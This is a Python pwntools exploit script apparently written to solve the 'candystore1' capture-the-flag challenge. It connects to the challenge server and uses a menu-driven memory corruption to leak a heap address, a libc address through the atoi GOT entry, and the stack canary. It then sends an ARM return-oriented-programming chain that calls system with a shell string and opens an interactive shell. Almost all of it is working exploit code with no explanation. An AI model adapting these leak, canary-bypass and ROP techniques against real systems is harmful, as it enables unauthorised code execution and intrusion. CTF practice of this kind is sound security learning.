#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "192.168.168.249"
#port = 8888
host = "candystore1.chal.ctf.westerns.tokyo"
port = 11111

def enter_admin():
    r.recvuntil(">")
    r.sendline("a")

def add_item(name,much,many):
    r.recvuntil(">")
    r.sendline("a")
    r.recvuntil(">")
    r.sendline(name)
    r.recvuntil(">")
    r.sendline(str(much))
    r.recvuntil(">")
    r.sendline(str(many))
    r.recvuntil(">")
    r.sendline("y")

def modify_store(name,num,no_line = None):
    r.recvuntil(">")
    r.sendline("m")
    r.recvuntil(">")
    if no_line :
        r.send(name)
    else :
        r.sendline(name)
    r.recvuntil(">")
    r.sendline(str(num))
    r.recvuntil(">")
    r.sendline("y")

def ret_user():
    r.recvuntil(">")
    r.sendline("r")

def put_item(idx,note):
    r.recvuntil(">")
    r.sendline("p")
    r.recvuntil(">")
    r.sendline(str(idx))
    r.recvuntil(">")
    r.sendline(note)
    r.recvuntil(">")
    r.sendline("y")
    r.recvuntil(">")
    r.sendline("n")

r = remote(host,port)
r.recvuntil("ID>")
r.send("k"*0x10)
r.recvuntil("Profile>")
r.send("a"*0x20)
r.recvuntil("$")
r.sendline("1")
enter_admin()
add_item("ddaa",123,123)
modify_store("o"*0x80,17,1)
for i in range(10):
    add_item("ddaa",123,123)
modify_store("a"*3+"\x00",17)
modify_store("a"*2+"\x00",17)
modify_store("a"*1+"\x00",17)
modify_store(p32(0),17)
add_item("orange",123,123)
ret_user()

put_item(17,"dada")
enter_admin()
r.recvuntil(">")
r.sendline("m")
r.recvuntil("name:")
data =r.recvuntil(">")[1:5]
heap = u32(data) - 0x308
print "heap:", hex(heap)
atoi_got = 0x00023ff0
r.sendline(p32(atoi_got))
r.recvuntil(">")
r.sendline("17")
r.recvuntil(">")
r.sendline("y")

ret_user()
r.recvuntil("+-- Contents of Cart ---------------")
r.recvuntil("Name:")
data = r.recvuntil("Value:")[1:5]
atoi = u32(data) 
#libc = atoi - 0x28691
#libc = atoi -0x26b18
libc = atoi - 0x2f1b8
print "libc:", hex(libc)

canary_addr = 0x024110
enter_admin()
modify_store(p32(canary_addr+1),17)
ret_user()
r.recvuntil("+-- Contents of Cart ---------------")
r.recvuntil("Name:")
data = "\x00" + r.recvuntil("Value:")[1:4]
canary = u32(data)
print "canary:",hex(canary)
r.recvuntil(">")
r.sendline("o")
r.recvuntil(">")
raw_input()
#sh = libc + 0xcbd3c
sh = libc + 0x011dc60
#system = libc + 0x2fc95
system = libc + 0x39fac
pop_r3_r4_r5_r6_r7_r8_r9_pc = 0x13308
rop = p32(pop_r3_r4_r5_r6_r7_r8_r9_pc) + p32(system) + p32(0)*3 + p32(sh) + p32(0)*2 + p32(0x000132f0)

r.sendline("aa" + p32(canary) + "a"*0x14 + rop)

r.interactive()
